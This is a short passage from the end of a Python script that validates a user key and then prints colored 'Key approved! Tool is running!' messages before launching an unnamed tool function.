                    pull_from_github(silent=True)
                    auto_delete_expired_keys()
                    if is_key_valid(user_key):
                        print(f"\n{' ' * 8}{G}[✓]{RESET} Key approved! Loading tool...")
                        print_line()
                        print(f"{' ' * 10}{G}[✓]{RESET} Key approved! Tool is running!")
                        print(f"{' ' * 12}{G}>>> TOOL UNLOCKED <<<{RESET}")
                        print_line()
                        BNG_71_()
                        return
            except KeyboardInterrupt:
                print(f"\n{' ' * 8}{R}[!]{RESET} Exited by user.")
                sys.exit(0)

if __name__ == "__main__":
    main()